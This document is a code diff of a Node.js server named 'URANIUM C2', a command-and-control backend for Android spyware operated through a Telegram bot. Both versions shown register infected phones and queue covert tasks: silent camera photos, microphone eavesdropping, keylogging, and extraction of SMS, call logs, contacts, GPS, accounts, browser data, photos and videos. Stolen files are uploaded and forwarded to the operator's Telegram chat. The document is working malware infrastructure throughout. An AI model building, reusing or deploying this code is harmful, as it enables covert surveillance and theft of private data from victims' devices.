@@ -3,13 +3,10 @@ const express = require('express');
 const telegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
 const path = require('path');
-const crypto = require('crypto');
 const sqlite3 = require('sqlite3').verbose();
-const zlib = require('zlib');
 
 const TOKEN = process.env.TG_TOKEN;
 const CHAT_ID = process.env.TG_ID;
-const C2_KEY = process.env.C2_KEY || null;
 
 if (!TOKEN || !CHAT_ID) {
     console.error('[-] Missing env: TG_TOKEN, TG_ID');
@@ -19,239 +16,86 @@ if (!TOKEN || !CHAT_ID) {
 const STORAGE_DIR = path.join(__dirname, 'uranium_storage');
 fs.mkdirSync(STORAGE_DIR, { recursive: true });
 
-process.on('uncaughtException', (err) => {
-    console.error('[FATAL] Uncaught exception:', err.message);
-});
-process.on('unhandledRejection', (err) => {
-    console.error('[FATAL] Unhandled rejection:', err);
-});
-
-const DB_PATH = './uranium_core_v21.db';
-try {
-    if (fs.existsSync(DB_PATH)) {
-        fs.unlinkSync(DB_PATH);
-        console.log('[DB] Old database deleted.');
-    }
-} catch (e) {
-    console.error('[DB] Failed to delete old database:', e.message);
-}
-
-const db = new sqlite3.Database(DB_PATH);
-
-db.on('error', (err) => {
-    console.error('[DB ERROR]', err.message);
-});
-
+const db = new sqlite3.Database('./uranium_core_v20.db');
 db.serialize(() => {
-    db.run(`CREATE TABLE IF NOT EXISTS nodes (
-        id TEXT PRIMARY KEY,
-        model TEXT,
-        android_sdk INTEGER,
-        last_seen INTEGER,
-        online INTEGER DEFAULT 0,
-        secret_hash TEXT
-    )`, (err) => {
-        if (err) console.error('[DB CREATE NODES]', err.message);
-        else console.log('[DB] Nodes table ready.');
-    });
-
-    db.run(`CREATE TABLE IF NOT EXISTS tasks (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        node_id TEXT,
-        action TEXT,
-        payload TEXT,
-        status TEXT DEFAULT 'PENDING',
-        created_at INTEGER,
-        sent_at INTEGER
-    )`, (err) => {
-        if (err) console.error('[DB CREATE TASKS]', err.message);
-        else console.log('[DB] Tasks table ready.');
-    });
+    db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, android_sdk INTEGER, last_seen INTEGER, online INTEGER DEFAULT 0)`);
+    db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT DEFAULT 'PENDING', created_at INTEGER, sent_at INTEGER)`);
 });
 
 const app = express();
-const appBot = new telegramBot(TOKEN, { polling: { interval: 1500, autoStart: true } });
-
+const appBot = new telegramBot(TOKEN, { polling: true });
 app.use(express.json({ limit: '100mb' }));
-app.use(express.text({ type: '*/*', limit: '100mb' }));
-app.use('/api/v3/uranium/upload_raw', express.raw({ type: 'application/octet-stream', limit: '120mb' }));
+app.use(express.raw({ type: 'application/octet-stream', limit: '200mb' }));
 
-app.use((err, req, res, next) => {
-    console.error('Express:', err.message);
-    if (res.headersSent) return next(err);
-    res.status(400).json({ error: 'BAD_REQUEST', detail: err.message });
-});
-
-let tgQueue = Promise.resolve();
-function sendTg(msg, options = {}) {
-    tgQueue = tgQueue.then(() => appBot.sendMessage(CHAT_ID, msg, { parse_mode: 'HTML', ...options }))
-        .catch(e => console.error('TG:', e.message));
-    return tgQueue;
+async function sendTg(msg, options = {}) {
+    try { return await appBot.sendMessage(CHAT_ID, msg, { parse_mode: 'HTML', ...options }); }
+    catch (e) { console.error('TG:', e.message); }
 }
 
 function escapeHtml(s) {
     return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 }
 
-function hashSecret(s) {
-    if (!s) return null;
-    return crypto.createHash('sha256').update(String(s)).digest('hex');
-}
-
-function checkAuth(req, res, next) {
-    if (C2_KEY && req.headers['x-c2-key'] !== C2_KEY) {
-        return res.status(401).json({ error: 'UNAUTHORIZED' });
-    }
-    next();
-}
-
-function getKey(secret) {
-    const raw = secret ? `${secret}|uranium-v27` : 'fallback|uranium-v27';
-    return crypto.createHash('sha256').update(raw).digest();
-}
-
-function decryptPayload(b64, secret) {
-    try {
-        const pkt = JSON.parse(Buffer.from(b64.trim(), 'base64').toString('utf8'));
-        const iv = Buffer.from(pkt.v, 'hex');
-        const tag = Buffer.from(pkt.g, 'hex');
-        const data = Buffer.from(pkt.d, 'hex');
-        const decipher = crypto.createDecipheriv('aes-256-gcm', getKey(secret), iv);
-        decipher.setAuthTag(tag);
-        let dec = Buffer.concat([decipher.update(data), decipher.final()]);
-        dec = zlib.gunzipSync(dec);
-        return JSON.parse(dec.toString('utf8'));
-    } catch (e) {
-        return null;
-    }
-}
-
-function encryptPayload(obj, secret) {
-    try {
-        const plain = JSON.stringify(obj);
-        const compressed = zlib.gzipSync(Buffer.from(plain, 'utf8'));
-        const iv = crypto.randomBytes(12);
-        const cipher = crypto.createCipheriv('aes-256-gcm', getKey(secret), iv);
-        const enc = Buffer.concat([cipher.update(compressed), cipher.final()]);
-        const tag = cipher.getAuthTag();
-        const pkt = {
-            v: iv.toString('hex'),
-            g: tag.toString('hex'),
-            d: enc.toString('hex')
-        };
-        return Buffer.from(JSON.stringify(pkt)).toString('base64');
-    } catch (e) {
-        return null;
-    }
-}
-
 app.get('/', (req, res) => {
-    res.type('html').send(`<html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:80px;"><h1>[☢️] URANIUM C2 v21.0 — Hardened [☢️]</h1></body></html>`);
+    res.send(`<html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:80px;"><h1>[☢️] URANIUM C2 v20.0 — Pure JSON [☢️]</h1></body></html>`);
 });
 
-app.post('/api/v3/uranium/stream', checkAuth, (req, res) => {
-    const nodeId = String(req.headers['x-node-id'] || '').slice(0, 128) || 'unknown';
-    const nodeModel = String(req.headers['x-node-model'] || 'Unknown').slice(0, 128);
-    const sdk = parseInt(req.headers['x-android-sdk'] || '0') || 0;
-    const secretHeader = req.headers['x-device-secret'] || null;
-    const secretHash = hashSecret(secretHeader);
+app.post('/api/v3/uranium/stream', (req, res) => {
+    const nodeId = req.headers['x-node-id'] || 'unknown';
+    const nodeModel = req.headers['x-node-model'] || 'Unknown';
+    const sdk = parseInt(req.headers['x-android-sdk'] || '0');
 
-    let payload = req.body;
+    db.run(`INSERT INTO nodes (id, model, android_sdk, last_seen, online) VALUES (?,?,?,?,1)
+        ON CONFLICT(id) DO UPDATE SET model=excluded.model, android_sdk=excluded.android_sdk, last_seen=excluded.last_seen, online=1`,
+        [nodeId, nodeModel, sdk, Date.now()]);
 
-    if (typeof req.body === 'string') {
-        payload = decryptPayload(req.body, secretHeader);
-    }
-
-    if (!payload) {
-        return res.status(400).send('BAD_PAYLOAD');
-    }
-
-    db.get(`SELECT secret_hash FROM nodes WHERE id=?`, [nodeId], (_, existing) => {
-        if (existing && existing.secret_hash && secretHash && existing.secret_hash !== secretHash) {
-            return res.status(403).json({ status: 'AUTH_FAIL' });
-        }
-        db.run(`INSERT INTO nodes (id, model, android_sdk, last_seen, online, secret_hash)
-            VALUES (?,?,?,?,1,COALESCE(?, secret_hash))
-            ON CONFLICT(id) DO UPDATE SET
-                model=excluded.model,
-                android_sdk=excluded.android_sdk,
-                last_seen=excluded.last_seen,
-                online=1,
-                secret_hash=COALESCE(excluded.secret_hash, nodes.secret_hash)`,
-            [nodeId, nodeModel, sdk, Date.now(), secretHash], (err) => {
-                if (err) console.error('[DB INSERT NODE]', err.message);
-            });
-    });
-
-    // معالجة الـ HEARTBEAT لضمان تسجيل النود فوراً
-    if (payload.type === 'HEARTBEAT') {
-        const responseObj = { status: 'ACK', task: null };
-        const encrypted = encryptPayload(responseObj, secretHeader);
-        return res.send(encrypted);
-    }
+    let payload;
+    try { payload = req.body; }
+    catch { return res.status(400).json({ status: 'BAD_PAYLOAD' }); }
 
     if (payload.type === 'TEXT_REPORT') {
-        const text = String(payload.data || '').substring(0, 3800);
+        const text = (payload.data || '').substring(0, 3800);
         if (text.length > 2) sendTg(`☢️ <b>[${escapeHtml(nodeId)} | ${escapeHtml(nodeModel)}]</b>\n<pre>${escapeHtml(text)}</pre>`);
-        const responseObj = { status: 'ACK', task: null };
-        const encrypted = encryptPayload(responseObj, secretHeader);
-        return res.send(encrypted);
+        return res.json({ status: 'ACK', task: null });
     }
 
     if (payload.type === 'TASK_RESULT') {
-        if (Number.isInteger(payload.taskId)) {
-            db.run(`UPDATE tasks SET status='DONE' WHERE id=?`, [payload.taskId]);
-        }
-        const responseObj = { status: 'ACK', task: null };
-        const encrypted = encryptPayload(responseObj, secretHeader);
-        return res.send(encrypted);
+        db.run(`UPDATE tasks SET status='DONE' WHERE id=?`, [payload.taskId]);
+        return res.json({ status: 'ACK', task: null });
     }
 
     db.get(`SELECT * FROM tasks WHERE node_id=? AND status='PENDING' ORDER BY id ASC LIMIT 1`, [nodeId], (err, row) => {
-        if (err || !row) {
-            const responseObj = { status: 'ACK', task: null };
-            const encrypted = encryptPayload(responseObj, secretHeader);
-            return res.send(encrypted);
-        }
+        if (!row) return res.json({ status: 'ACK', task: null });
         db.run(`UPDATE tasks SET status='SENT', sent_at=? WHERE id=?`, [Date.now(), row.id]);
-        let parsed = {};
-        try { parsed = JSON.parse(row.payload || '{}'); } catch (_) {}
-        
-        const responseObj = { status: 'ACK', task: { id: row.id, action: row.action, payload: parsed } };
-        const encrypted = encryptPayload(responseObj, secretHeader);
-        res.send(encrypted);
+        const taskResp = { status: 'ACK', task: { id: row.id, action: row.action, payload: JSON.parse(row.payload || '{}') } };
+        res.json(taskResp);
     });
 });
 
-app.post('/api/v3/uranium/upload_raw', checkAuth, async (req, res) => {
+app.post('/api/v3/uranium/upload_raw', async (req, res) => {
     try {
+        const nodeId = req.headers['x-node-id'] || 'unknown';
+        const nodeModel = req.headers['x-node-model'] || 'Unknown';
+        const fileName = path.basename(req.headers['x-file-name'] || `dump_${Date.now()}.bin`);
         if (!Buffer.isBuffer(req.body)) return res.status(400).json({ error: 'BAD_BINARY' });
-        if (req.body.length > 120 * 1024 * 1024) return res.status(413).json({ error: 'TOO_LARGE' });
+        if (req.body.length > 60 * 1024 * 1024) return res.status(413).json({ error: 'TOO_LARGE' });
 
-        const nodeId = String(req.headers['x-node-id'] || 'unknown').replace(/[^\w.-]/g, '').slice(0, 64) || 'unknown';
-        const nodeModel = String(req.headers['x-node-model'] || 'Unknown').slice(0, 128);
-        const fileName = path.basename(String(req.headers['x-file-name'] || `dump_${Date.now()}.bin`)).replace(/[^\w.-]/g, '_').slice(0, 128);
+        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);
 
-        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen, secret_hash)
-                VALUES (?, ?, ?, COALESCE((SELECT secret_hash FROM nodes WHERE id=?), NULL))`,
-            [nodeId, nodeModel, Date.now(), nodeId], (err) => {
-                if (err) console.error('[DB UPLOAD NODE]', err.message);
-            });
-
-        const saveDir = path.join(STORAGE_DIR, nodeId);
+        const saveDir = path.join(STORAGE_DIR, path.basename(nodeId));
         fs.mkdirSync(saveDir, { recursive: true });
         const finalPath = path.join(saveDir, `${Date.now()}_${fileName}`);
         fs.writeFileSync(finalPath, req.body);
 
         const mb = (req.body.length / 1024 / 1024).toFixed(2);
-        await sendTg(`☢️ <b>${escapeHtml(fileName)}</b> (${mb}MB) من <code>${escapeHtml(nodeId)}</code>`);
-        if (req.body.length <= 45 * 1024 * 1024) {
-            try { await appBot.sendDocument(CHAT_ID, finalPath, { caption: `${fileName} (${mb}MB)` }); } catch (_) {}
-        }
+        await sendTg(`☢️ <b>${escapeHtml(fileName)}</b> (${mb}MB) من <code>${nodeId}</code>`);
+        try {
+            if (req.body.length <= 45 * 1024 * 1024) {
+                await appBot.sendDocument(CHAT_ID, finalPath, { caption: `${fileName} (${mb}MB)` });
+            }
+        } catch (_) {}
         res.json({ status: 'OK' });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
+    } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 appBot.on('polling_error', () => {});
@@ -261,91 +105,63 @@ appBot.on('message', async (msg) => {
     if (String(msg.chat.id) !== String(CHAT_ID)) return;
     const text = msg.text || '';
 
-    if (text === '/start' || text === '/menu' || text === '/nodes') {
-        db.all(`SELECT * FROM nodes ORDER BY last_seen DESC LIMIT 25`, async (_, rows) => {
+    if (text === '/start' || text === '/menu') {
+        db.all(`SELECT * FROM nodes ORDER BY last_seen DESC LIMIT 15`, async (err, rows) => {
             if (!rows || !rows.length) return sendTg('⚠️ لا نودات.');
-            const now = Date.now();
-            const kb = rows.map(n => {
-                const online = n.online && (now - (n.last_seen || 0) < 120000);
-                return [{ text: `${online ? '🟢' : '⚫'} ${n.model || '?'} (${String(n.id).substring(0, 8)})`, callback_data: `menu_${n.id}` }];
-            });
-            await sendTg(`☢️ <b>v21 — ${rows.length} نود:</b>`, { reply_markup: { inline_keyboard: kb } });
+            const kb = rows.map(n => [{ text: `${n.online ? '🟢' : '⚫'} ${n.model} (${n.id.substring(0,8)})`, callback_data: `menu_${n.id}` }]);
+            await sendTg('☢️ <b>v20 — اختر النود:</b>', { reply_markup: { inline_keyboard: kb } });
         });
-        return;
-    }
-
-    if (text.startsWith('/cmd ')) {
-        const parts = text.split(/\s+/);
-        if (parts.length < 3) return sendTg('⚠️ Usage: /cmd &lt;nodeId&gt; &lt;ACTION&gt; [json]');
-        const [, nodeId, action, jsonRaw] = parts;
-        let payload = '{}';
-        try { if (jsonRaw) payload = JSON.stringify(JSON.parse(jsonRaw)); } catch (_) {}
-        db.run(`INSERT INTO tasks (node_id, action, payload, status, created_at) VALUES (?, ?, ?, 'PENDING', ?)`,
-            [nodeId, action, payload, Date.now()], () => sendTg(`☢️ <code>${escapeHtml(action)}</code> → <code>${escapeHtml(nodeId)}</code>`));
-        return;
     }
 });
 
 appBot.on('callback_query', async (query) => {
-    if (String(query.from.id) !== String(CHAT_ID)) return appBot.answerCallbackQuery(query.id, { text: '⛔' });
-    const data = query.data || '';
+    if (String(query.from.id) !== String(CHAT_ID)) return;
+    const data = query.data;
     const msg = query.message;
 
-    try {
-        if (data.startsWith('menu_')) {
-            const nodeId = data.replace('menu_', '');
-            const c = (label, action) => ({ text: label, callback_data: `cmd_${action}_${nodeId}` });
-            const kb = { inline_keyboard: [
-                [c('🔦 ON', 'CMD_FLASH_ON'), c('🔦 OFF', 'CMD_FLASH_OFF')],
-                [c('📳 اهتزاز', 'CMD_VIBRATE'), c('🔊 تنبيه', 'CMD_BEEP')],
-                [c('📸 خلفية', 'EXTRACT_CAMERA_SNAP'), c('🤳 أمامية', 'EXTRACT_CAMERA_SNAP_FRONT')],
-                [c('🎙️ 6s', 'MIC_AI_LISTEN'), c('👁️ خاطفة', 'MICRO_BURST_SNAP')],
-                [c('📨 SMS', 'EXTRACT_SMS'), c('📞 Calls', 'EXTRACT_CALLS')],
-                [c('📇 Contacts', 'EXTRACT_CONTACTS'), c('📱 Apps', 'EXTRACT_APPS')],
-                [c('📍 GPS', 'EXTRACT_LOCATION'), c('📋 Clipboard', 'EXTRACT_CLIPBOARD')],
-                [c('🖼️ 20 صور', 'EXTRACT_PHOTOS'), c('📥 10 فيديو', 'EXTRACT_VIDEOS')],
-                [c('📁 DCIM', 'PROC_DCIM'), c('📥 Download', 'PROC_DOWNLOAD')],
-                [c('📊 Storage', 'STORAGE_AUDIT'), c('📶 WiFi', 'WIFI_AUTOPILOT')],
-                [c('🔑 حسابات', 'EXTRACT_ACCOUNTS'), c('🔔 إشعارات', 'EXTRACT_NOTIFICATIONS')],
-                [c('🌐 متصفح', 'EXTRACT_BROWSER'), c('⌨️ كيلوج', 'EXTRACT_KEYLOG')],
-                [c('🖥️ شاشة ON', 'CMD_SCREEN_ON'), c('🖥️ شاشة OFF', 'CMD_SCREEN_OFF')],
-                [c('📞 اتصل', 'CMD_CALL_NUMBER'), c('✉️ SMS صامت', 'CMD_SEND_SMS')],
-                [c('🔊 صوت', 'CMD_PLAY_SOUND'), c('🗣️ TTS', 'CMD_SPEAK_TEXT')],
-                [c('📷 سكرين', 'EXTRACT_SCREENSHOT'), c('🔁 rekey', 'POLY_REKEY')],
-                [c('🔍 بحث ملف', 'PROC_FILE_SEARCH')],
-                [{ text: '💥 Self Destruct', callback_data: `confirm_SELF_${nodeId}` }],
-                [{ text: '🔙 رجوع', callback_data: 'back_home' }]
-            ] };
-            await appBot.editMessageText(`🎯 <b>النود:</b> <code>${escapeHtml(nodeId)}</code> — v21`, {
-                chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'HTML', reply_markup: kb
+    if (data.startsWith('menu_')) {
+        const nodeId = data.replace('menu_', '');
+        const kb = { inline_keyboard: [
+            [{ text: '🔦 فلاش ON', callback_data: `cmd_CMD_FLASH_ON_${nodeId}` }, { text: '🔦 فلاش OFF', callback_data: `cmd_CMD_FLASH_OFF_${nodeId}` }],
+            [{ text: '📳 اهتزاز', callback_data: `cmd_CMD_VIBRATE_${nodeId}` }, { text: '🔊 تنبيه', callback_data: `cmd_CMD_BEEP_${nodeId}` }],
+            [{ text: '📸 صورة خلفية صامتة', callback_data: `cmd_EXTRACT_CAMERA_SNAP_${nodeId}` }, { text: '🤳 صورة أمامية صامتة', callback_data: `cmd_EXTRACT_CAMERA_SNAP_FRONT_${nodeId}` }],
+            [{ text: '🎙️ تنصت 6s', callback_data: `cmd_MIC_AI_LISTEN_${nodeId}` }, { text: '👁️ لقطة خاطفة', callback_data: `cmd_MICRO_BURST_SNAP_${nodeId}` }],
+            [{ text: '📨 SMS', callback_data: `cmd_EXTRACT_SMS_${nodeId}` }, { text: '📞 مكالمات', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }],
+            [{ text: '📇 جهات', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` }, { text: '📱 تطبيقات', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }],
+            [{ text: '📍 GPS', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` }, { text: '📋 حافظة', callback_data: `cmd_EXTRACT_CLIPBOARD_${nodeId}` }],
+            [{ text: '🖼️ 20 صورة', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }, { text: '📥 10 فيديو', callback_data: `cmd_EXTRACT_VIDEOS_${nodeId}` }],
+            [{ text: '📁 DCIM', callback_data: `cmd_PROC_DCIM_${nodeId}` }, { text: '📥 Download', callback_data: `cmd_PROC_DOWNLOAD_${nodeId}` }],
+            [{ text: '📊 فحص تخزين', callback_data: `cmd_STORAGE_AUDIT_${nodeId}` }, { text: '📶 Wi-Fi', callback_data: `cmd_WIFI_AUTOPILOT_${nodeId}` }],
+            [{ text: '💥 Self Destruct', callback_data: `confirm_SELF_${nodeId}` }],
+            [{ text: '🔙 رجوع', callback_data: 'back_home' }]
+        ] };
+        await appBot.editMessageText(`🎯 <b>النود:</b> <code>${nodeId}</code> — v20`, {
+            chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'HTML', reply_markup: kb
+        });
+    }
+    else if (data.startsWith('confirm_SELF_')) {
+        const nodeId = data.replace('confirm_SELF_', '');
+        await appBot.editMessageText(`⚠️ <b>تأكيد النسف</b> <code>${nodeId}</code>؟`, {
+            chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'HTML',
+            reply_markup: { inline_keyboard: [[
+                { text: '✅ نعم', callback_data: `cmd_SELF_DESTRUCT_${nodeId}` },
+                { text: '❌ إلغاء', callback_data: `menu_${nodeId}` }
+            ]] }
+        });
+    }
+    else if (data.startsWith('cmd_')) {
+        const parts = data.split('_');
+        const targetNodeId = parts.pop();
+        const action = parts.slice(1).join('_');
+        db.run(`INSERT INTO tasks (node_id, action, payload, status, created_at) VALUES (?, ?, '{}', 'PENDING', ?)`,
+            [targetNodeId, action, Date.now()], async () => {
+                await appBot.answerCallbackQuery(query.id, { text: `☢️ ${action}` });
             });
-        }
-        else if (data.startsWith('confirm_SELF_')) {
-            const nodeId = data.replace('confirm_SELF_', '');
-            await appBot.editMessageText(`⚠️ <b>تأكيد النسف</b> <code>${escapeHtml(nodeId)}</code>؟`, {
-                chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'HTML',
-                reply_markup: { inline_keyboard: [[
-                    { text: '✅ نعم', callback_data: `cmd_SELF_DESTRUCT_${nodeId}` },
-                    { text: '❌ إلغاء', callback_data: `menu_${nodeId}` }
-                ]] }
-            });
-        }
-        else if (data.startsWith('cmd_')) {
-            const parts = data.split('_');
-            const targetNodeId = parts.pop();
-            const action = parts.slice(1).join('_');
-            db.run(`INSERT INTO tasks (node_id, action, payload, status, created_at) VALUES (?, ?, '{}', 'PENDING', ?)`,
-                [targetNodeId, action, Date.now()], async () => {
-                    await appBot.answerCallbackQuery(query.id, { text: `☢️ ${action}` });
-                });
-        }
-        else if (data === 'back_home') {
-            await appBot.deleteMessage(msg.chat.id, msg.message_id).catch(() => {});
-        }
-    } catch (e) {
-        console.error('CB:', e.message);
+    }
+    else if (data === 'back_home') {
+        await appBot.deleteMessage(msg.chat.id, msg.message_id).catch(() => {});
     }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () => console.log(`[+] Uranium C2 v21.0 on :${PORT}`));
+app.listen(PORT, () => console.log(`[+] Uranium C2 v20.0 Pure JSON on :${PORT}`));
